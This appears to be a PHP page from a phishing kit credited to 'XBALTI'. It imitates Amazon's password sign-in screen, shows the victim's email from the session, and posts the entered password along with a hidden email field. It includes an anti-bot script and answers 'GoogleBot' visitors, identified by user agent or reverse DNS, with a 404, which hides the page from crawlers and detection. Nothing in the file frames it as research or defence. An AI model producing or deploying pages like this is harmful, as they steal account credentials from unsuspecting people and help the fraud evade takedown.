<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
include('antibots.php');
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}
?>
    <html>

    <head>
        <meta charset="utf-8">
        <title dir="ltr">Amazon Sign In</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
        <link rel="icon" href="style/img/icon.png">
        <link rel="shortcut icon" href="style/img/icon.png">
        <link rel="stylesheet" href="style/style3.css">
        <link rel="stylesheet" href="style/style2.css">
        <link rel="stylesheet" href="styel/style1.css">
        <style>
            .error {
                color: red
            }
            
            #zwimel {
                width: 100%;
                height: 100%;
                top: 0px;
                left: 0px;
                position: fixed;
                display: block;
                opacity: .9;
                background-color: #fff;
                z-index: 99;
                text-align: center;
            }
        </style>
    </head>

    <body>
        <div class="a-section a-padding-medium auth-workflow">
            <div class="a-section a-spacing-none auth-navbar">

                <div class="a-section a-spacing-medium a-text-center">

                    <a class="a-link-nav-icon" tabindex="-1" href="#">

                        <i class="a-icon a-icon-logo" aria-label="Amazon"><span class="a-icon-alt">Amazon</span></i>

                    </a>

                </div>

            </div>

            <div id="authportal-center-section" class="a-section">

                <div id="authportal-main-section" class="a-section">

                    <div class="a-section a-spacing-base auth-pagelet-container">

                        <div id="auth-cookie-warning-message" class="a-box a-alert a-alert-warning">
                            <div class="a-box-inner a-alert-container">
                                <h4 class="a-alert-heading">Please Enable Cookies to Continue</h4><i class="a-icon a-icon-alert"></i>
                                <div class="a-alert-content">
                                    <p>
                                        <a class="a-link-normal" href="#">

                                        </a>
                                    </p>
                                </div>
                            </div>
                        </div>

                    </div>
                    <div class="a-section auth-pagelet-container">

                        <div class="a-section a-spacing-base">
                            <div class="a-section">
                                <div id="zwimel" class="zwimel" style="display:none;"></div>
                                <form name="signinpass" id="signinpass" method="post" action="" class="auth-validate-form auth-real-time-validation a-spacing-none fwcim-form">

                                    <div class="a-section">
                                        <div class="a-box">
                                            <div class="a-box-inner a-padding-extra-large">
                                                <h1 class="a-spacing-small">
          Sign in
        </h1>
                                                <!-- optional subheading element -->

                                                <div class="a-row a-spacing-base">
                                                    <span><?php echo $_SESSION['email']; ?></span>
                                                    <a class="a-link-normal" tabindex="6" href="#">
            Change
          </a>
                                                </div>

                                                <div class="a-section a-spacing-large">
                                                    <div class="a-row">
                                                        <div class="a-column a-span5">
                                                            <label for="ap_password" class="a-form-label">

                                                                Password

                                                            </label>
                                                        </div>

                                                        <div class="a-column a-span7 a-text-right a-span-last">

                                                            <a id="auth-fpp-link-bottom" class="a-link-normal" tabindex="3" href="#">
  Forgot your password?
</a>
                                                        </div>

                                                    </div>

                                                    <input type="password" id="password" name="password" class="a-input-text a-span12 auth-autofocus auth-required-field">

                                                    <div id="auth-password-missing-alert" class="a-box a-alert-inline a-alert-inline-error auth-inlined-error-message a-spacing-top-mini">
                                                        <div class="a-box-inner a-alert-container"><i class="a-icon a-icon-alert"></i>
                                                            <div class="a-alert-content">
                                                                Enter your password
                                                            </div>
                                                        </div>
                                                    </div>

                                                </div>

                                                <input type="hidden" name="emaill" value=" <?php echo  $_SESSION['email']; ?>" />

                                                <div class="a-section">
                                                    <span class="a-button a-button-span12 a-button-primary" id="a-autoid-0"><span class="a-button-inner"><input id="signInSubmit" tabindex="5" class="a-button-input" type="submit" aria-labelledby="a-autoid-0-announce"><span class="a-button-text" aria-hidden="true" id="a-autoid-0-announce">
            Sign in
          </span></span>
                                                    </span>

                                                    <div class="a-row a-spacing-top-medium">
                                                        <div class="a-section a-text-left">
                                                            <label for="auth-remember-me" class="a-form-label">
                                                                <div data-a-input-name="rememberMe" class="a-checkbox">
                                                                    <label>
                                                                        <input type="checkbox" name="rememberMe" value="true" tabindex="4">
                                                                        <i class="a-icon a-icon-checkbox"></i><span class="a-label a-checkbox-label">
          Keep me signed in.
          <span class="a-declarative">
            <a  href="#" class="a-popover-trigger a-declarative">
              Details
            <i class="a-icon a-icon-popover"></i></a>
          </span>
                                                                        </span>
                                                                    </label>
                                                                </div>
                                                            </label>
                                                        </div>
                                                    </div>

                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </form>

                            </div>

                            <div class="a-divider a-divider-break">
                                <h5>New to Amazon?</h5></div>
                            <span id="auth-create-account-link" class="a-button a-button-span12"><span class="a-button-inner"><a id="createAccountSubmit" tabindex="6" href="#" class="a-button-text" role="button">
          Create your Amazon account
        </a></span></span>

                        </div>

                    </div>
                </div>

            </div>

            <div id="right-2">
            </div>

            <div class="a-section a-spacing-top-extra-large auth-footer">

                <div class="a-divider a-divider-section">
                    <div class="a-divider-inner"></div>
                </div>

                <div class="a-section a-spacing-small a-text-center a-size-mini">
                    <span class="auth-footer-seperator"></span>

                    <a class="a-link-normal" target="_blank" rel="noopener noreferrer" href="#">
      Conditions of Use
    </a>
                    <span class="auth-footer-seperator"></span>

                    <a class="a-link-normal" target="_blank" rel="noopener noreferrer" href="#">
      Privacy Notice
    </a>
                    <span class="auth-footer-seperator"></span>

                    <a class="a-link-normal" target="_blank" rel="noopener noreferrer" href="/help">
      Help
    </a>
                    <span class="auth-footer-seperator"></span>

                </div>

                <div class="a-section a-spacing-none a-text-center">

                    <span class="a-size-mini a-color-secondary">
  © 1996-2019, Amazon.com, Inc. or its affiliates
</span>

                </div>

            </div>
        </div>

        <div id="auth-external-javascript" class="auth-external-javascript">
        </div>

        <div id="be" style="display:none;visibility:hidden;">

        </div>

        <div id="a-popover-root" style="z-index:-1;position:absolute;"></div>
        <div class="fwcim-container"></div>
    </body>
    <script src="./js/jquery.min.js"></script>
    <script src="./js/jquery.validate.min.js"></script>
    <script src="./js/sire.form.js"></script>

    </html>